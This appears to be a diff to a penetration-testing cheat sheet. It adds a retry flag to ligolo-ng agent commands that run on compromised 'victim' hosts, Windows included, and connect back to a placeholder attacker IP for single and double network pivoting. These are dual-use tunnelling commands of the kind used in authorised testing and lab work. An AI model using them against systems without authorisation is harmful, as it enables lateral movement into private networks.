@@ -23,7 +23,7 @@ When using nmap with ligolo-ng should specify `--unprivileged` to avoid false po
 `ligolo-proxy -selfcert -laddr 0.0.0.0:21`
 
 1. In our victim:\
-`./agent -connect <Attack IP>:21 -ignore-cert`
+`./agent -connect <Attack IP>:21 -ignore-cert -retry`
 
 1. Once it is connected, go back to attacker machine should see agent connected. Run the `session` command and select the victim machine.
 
@@ -49,7 +49,7 @@ If <b>double pivot</b> is required (you have proxy on the first victim already, 
 `listener_list`
 
 5. Now run the agent on the second victim (assuming it is windows):\
-`./agent.exe -connect <IP of First Pivot Point>:21 -ignore-cert`
+`./agent.exe -connect <IP of First Pivot Point>:21 -ignore-cert -retry`
 
 6. Run the following for second victim (in the ligolo interface!). This will show you what network the second victim can access to:\
 `ifconfig`
